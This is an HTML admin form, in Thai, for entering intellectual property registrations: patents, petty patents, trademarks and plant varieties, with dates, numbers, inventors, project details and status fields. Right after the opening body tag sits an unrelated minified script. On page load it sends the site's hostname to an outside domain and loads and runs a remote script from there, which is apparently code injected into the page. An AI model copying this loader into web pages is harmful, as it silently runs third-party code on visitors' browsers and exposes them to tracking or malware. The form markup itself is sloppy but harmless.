<meta charset="UTF-8">
<style>
    .tt {
        border: 8px solid #ba4242;
        width: 200px;
        border-radius: 45px;
        text-align: center;
        color: black;
        background-color: rgb(239 75 75);
        margin-left: 5px;
        margin-top: 40px;
        padding: 7px;
        margin: 0 auto;
    }

    .tb {
        background-color: #FFDAB9;
        
        color: #000;
    }

    .center {
        margin-left: auto;
        margin-right: 40px;
        font-size: 14px;
        color: black;
        text-align: center;
        height: 20px;
        padding:10px;
        border-radius:8px ;
    }
      .center1 {
        margin-left: auto;
        margin-right: auto;
        font-size: 14px;
        color: black;
        text-align: center;
        height: 20px;
        padding:10px;
        border-radius:8px ;
    }

    .tr {

        margin-left: auto;
        margin-right: auto;
        margin-top: 50px;
    }

    .button:hover {
        background-color: #3e8e41;
    }

    .button:active {
        background-color: #3e8e41;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1:hover {
        background-color: red;
    }

    .button1:active {
        background-color: #d90d19;
        box-shadow: 0 5px #666;
        transform: translateY(4px);
    }

    .button1 {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: red;
        border: none;
        border-radius: 12px;
        box-shadow: 0 2px white;
        margin-left: 200%;
        margin-top: 5px;
    }


    .button {
        display: inline-block;
        padding: 10px 20px;
        font-size: 16px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        outline: none;
        color: #fff;
        background-color: #4CAF50;
        border: none;
        border-radius: 12px;
        box-shadow: 0 2px white;
        margin-left: 450px;
        margin-top: 5px;
    }

    .box2 {
        width: 100%;
        height: 1000px;
        -webkit-backdrop-filter: blur(10px);
        backdrop-filter: blur(10px);
        background-color: #f99f37;
        border-radius: 0.25rem;
        margin: auto;
        align-items: center;
    }
    .glow {
            font-size: 26px;
            color: black;
            text-align: center;
            animation: glow 1s ease-in-out infinite alternate;
            color: black;
            padding: 0.5em 0;
            border-top: solid 3px black;
            border-bottom: solid 3px black;
            width: 30%;
            margin-left:540px;
            margin-top:40px;
            border-radius: 10px;
        }
        p.outset1 {
            display: inline; 
            width: 130px;
            border-style: outset;
            background:#2c15b1;
            text-align: center;
            margin-left: 10%;
            margin-top: 2%;
            color: white;
            height: 40px;
            padding: 10px;
            outline-color:red;
            border-radius:8px ;
        }
        .outset1:active {
            background-color: #442bd1;
            box-shadow: 0 4px #666;
            transform: translateY(4px);
        }
        input:not([type="image" i]) {
             box-sizing: border-box;
            
        }

        input[type="file" i] {
                appearance: none;
                background-color: initial;
                cursor: default;
                align-items: baseline;
                color: inherit;
                text-overflow: ellipsis;
                white-space: pre;
                text-align: start !important;
                padding: initial;
                border: initial;
                overflow: hidden !important;
        }
        td {
                display: table-cell;
                 vertical-align: inherit;
                 margin-right:50px;

        }
        th {
                 display: table-cell;
                vertical-align: inherit;
                font-weight: bold;
                 text-align: -internal-center;
                 padding:25px;
            }
            p.outset {
            display: inline;
            width: 130px;
            border-style: outset;
            background: #c32da9;
            text-align: center;
            color: white;
            height: 40px;
            padding: 10px;
            outline-color: red;
            border-radius: 10px;
        }
</style>
<body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script><div class="body">
<h1 class="glow">การจดทะเบียนทรัพย์สินทางปัญญา</h1>
    <br>
    <a style="text-decoration: none;" onclick="location. href='indexadmin.php?Menu=5&Submenu=showmanage'; ">
        <p class="outset">ย้อนกลับ</p></a><br><br>
    <div class="box2">
            <br>
            <table class="center1">
                <tbody><tr><th align="left" width="70%" class="tt">ประเภทการจดทะเบียน</th>
                <th class="th">
                    <input type="radio" id="html" name="fav_language" value="HTML">
                    &nbsp; <label for="html">สิทธิบัตร</label>
                    &nbsp; <input type="radio" id="css" name="fav_language" value="CSS">
                    &nbsp; <label for="css">อนุสิทธิบัตร</label>
                    <input type="radio" id="css" name="fav_language" value="CSS">
                    &nbsp; <label for="css">เครื่องหมายการค้า</label>
                    <input type="radio" id="css" name="fav_language" value="CSS">
                    &nbsp; <label for="css">พันธุ์พืช</label>
                </th><th>
            </th></tr>
        </tbody></table>
        <table class="center">
       <table style="width:60%" class="center">
            <tbody><tr class="tr">
                <th>วันที่ยื่นขอ</th>
                <th>เลขที่คำขอ</th>
                <th>เเบบพิมพ์คำขอสิทธิบัตร<br>/อนุสิทธิบัตร จดทะเบียน</th>
                <th>สำหรับแอดมิน</th>
                <th>ตัวเเทน</th>

            </tr>
            <tr class="tr">

                <td>
                    <input type="date" id="ddmmyy" onchange="selectday()" class="width:80% center">
                    <div id="result"></div>
                </td>
                <td>
                    <div class="container">
                        <input type="number" id="number" class="width:80% center" placeholder="000000" name="name" required="">
                </div></td>
                <td>
                    <label for="myfile">กรุณาเลือกไฟล์</label>
                   <br> <input type="file" id="myfile" name="myfile">
                </td>
                <td>
                    <label for="myfile">กรุณาเลือกไฟล์</label>
                    <input type="file" id="myfile" name="myfile">
                </td>
                <td>
                    <div class="container">
                        <input type="text" id="number" class="width:80% center" placeholder="xxxx" name="name" required="">
                </div></td>
            </tr>
            <tr class="tr">
                <th>เลขทะเบียน</th>
                <th>วันที่ออกเลขทะเบียน</th>
                <th>ชนิด</th>
                <th>ชื่อเรื่อง</th>
                <th>ผู้ทรงสิทธิ</th>
            </tr>
            <tr class="tr">
                <td>
                    <div class="container">
                        <input type="number" id="number" placeholder="000000" name="name" required="" class="width:80% center">
                </div></td>
                <td>
                    <input type="date" id="ddmmyy" onchange="selectday()" class="width:80% center">
                    <div id="result"></div>
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">--กรุณาเลือก--
                        </option><option value="1">การประดิษฐ์
                        </option><option value="2">การออกแบบ
                        </option><option value="3">การรับรอง
                        </option><option value="4">การบริการ
                        </option><option value="5">การขึ้นทะเบียน
                    </option></select>
                </td>
                <td>
                    <div class="container">
                        <input type="text" id="number" class="width:80% center" placeholder="xxxx" name="name" required="">
                </div></td>

                <td>
                    <div class="container">
                        <input type="text" id="number" placeholder="xxx" name="name" required="" class="width:80% center">
                </div></td>
                
            </tr>
            <tr class="tr">
                <th>กลุ่ม</th>
                <th>สังกัด</th>
                <th>ผู้ประดิษฐ์(1คน)</th>
                <th>ผู้ประดิษฐ์(1-15)</th>
                <th>ชื่อโครงการ(กตป.)</th>
            </tr>
            <tr class="tr">
                <td><select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">--กรุณาเลือก--
                        </option><option value="1">อช.
                        </option><option value="2">พช.
                        </option><option value="3">บอ.
                    </option></select>
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">--กรุณาเลือก--
                        </option><option value="1">ศนก.
                        </option><option value="2">ศคช.
                        </option><option value="3">ศนอ.
                        </option><option value="3">ศนส.
                        </option><option value="3">ศนพ.
                        </option><option value="3">ศนว.
                        </option><option value="3">ศนย.
                        </option><option value="3">ศบท.
                        </option><option value="3">ศพว.
                    </option></select>
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">ช่องกรอก
                        </option><option value="1">คนที่1
                        </option><option value="2">คนที่2
                        </option><option value="3">คนที่3
                    </option></select>
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">ช่องกรอก
                        </option><option value="1">คนที่1
                        </option><option value="2">คนที่2
                        </option><option value="3">คนที่3
                    </option></select>
                </td>
                <td>
                    <div class="container">
                        <input type="text" id="number" class="width:80% center" placeholder="xxxx" name="name" required="">
                </div></td>
            </tr>
            <tr>
                <th>รหัสโครงการวิจัย บริการวิจัย</th>
                <th>คู่สัญญาโครงการ</th>
                <th>ประเภทโครงการ</th>
                <th>เเนบเอกสารโครงการ</th>
                <th>ประเภทการใช้ประโยชน์</th>
            </tr>
            <tr class="tr">
                <td>
                    <div class="container">
                        <input type="number" id="number" placeholder="0" name="name" required="" class="width:80% center">
                </div></td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">กรุณาเลือก</option>
                        <option value="1">คนที่1
                        </option><option value="2">คนที่2
                        </option><option value="3">คนที่3
                    </option></select>
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">กรุณาเลือก</option>
                        <option value="1">การบริการวิจัย
                        </option><option value="2">การบริการวิจัยจากแหล่งทุน
                        </option><option value="3">mou
                        </option><option value="3">เงินทุน วว.
                        </option><option value="3">การถ่ายทอดเทคโนโลยี
                    </option></select>
                </td>
                <td>
                    <label for="myfile">กรุณาเลือกไฟล์</label>
                    <input type="file" id="myfile" name="myfile">
                </td>
                <td>
                    <select name="ICECREAM" class="width:80% center"> Answer 1
                        <option selected="" value="VANI">กรุณาเลือก</option>
                        <option value="1">การบริการวิจัย
                        </option><option value="2">การถ่ายทอดเทคโนโลยี
                        </option><option value="3">การอนุญาตให้ใช้สิทธิ
                        </option><option value="3">mou
                    </option></select>
                </td>



            </tr>
            <tr class="tr">
                <th>ผู้นำผลงานวิจัยไปใช้ประโยชน์</th>
                <th>สถานะอัพเดทปัจจุบัน</th>
                <th>หมายเหตุ</th>
            </tr>
            <tr class="tr">
                <td>
                    <div class="container">
                        <input type="text" id="number" class="width:80% center" placeholder="xxxx" name="name" required="">
                </div></td>
                <td>
                    <select name="ICECREAM" class="width:70% center"> Answer 1
                        <option selected="" value="VANI">ช่องกรอก
                        </option><option value="1">แก้ไข
                        </option><option value="2">ชำระค่าธรรมเนียมประกาศโฆษณา
                        </option><option value="3">ประกาศโฆษณา
                        </option><option value="3">ยื่นตรวจสอบการประดิษฐ์
                        </option><option value="3">ชำระค่าออกสิทธิบัตร
                        </option><option value="3">ชำระค่าออกอนุสิทธิบัตร
                        </option><option value="3">ออกสิทธิบัตร
                        </option><option value="3">ออกอนุสิทธิบัตร
                        </option><option value="3">ชำระค่าธรรมเนียมสิทธิบัตรรายปี
                        </option><option value="3">ชำระค่าธรรมเนียมอนุสิทธิบัตรรายปี
                        </option><option value="3">ไม่มีขั้นการประดิษฐ์ที่สูงขึ้น
                        </option><option value="3">ชี้แจงข้อโต้แย้ง
                        </option><option value="3">เปลี่ยนแปลงสิทธิ
                        </option><option value="3">ละทิ้งคำขอ
                        </option><option value="3">สิ้นอายุ
                    </option></select>
                </td>
                <td>
                    <div class="container">
                        <input type="text" id="number" class="width:80% center" placeholder="xxxx" name="name" required="">
                </div></td>
            </tr>


    
    
    
    </tbody></table>
    <table table="" style="width:20%" class="center1">

        <tbody><tr><th><button class="button">บันทึก</button></th>
        <th><button class="button1">ยกเลิก</button></th>

    </tr></tbody></table>
    </div></div></body>
    
   